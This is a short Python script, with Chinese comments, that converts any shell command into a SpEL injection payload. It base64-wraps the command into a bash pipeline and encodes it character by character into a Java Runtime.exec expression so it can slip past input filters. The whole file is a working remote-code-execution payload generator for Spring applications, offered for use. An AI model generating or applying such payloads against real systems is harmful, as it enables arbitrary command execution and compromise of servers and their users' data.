#将命令转换为SpEL表达式并输出
import base64
def shell_to_spel(command):
    # 将shell命令转换为SpEL payload
    command = base64.b64encode(command.encode("utf-8"))
    command = command.decode()  # 将bytes转换为string
    command = "bash -c {echo," + command + "}|{base64,-d}|{bash,-i}"  # 转换命令的格式
    message = command
    poc = '{T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])
    for ch in message[1:]:
        poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)
    poc += ')}'
    return poc
command = input("命令:")
print(shell_to_spel(command))
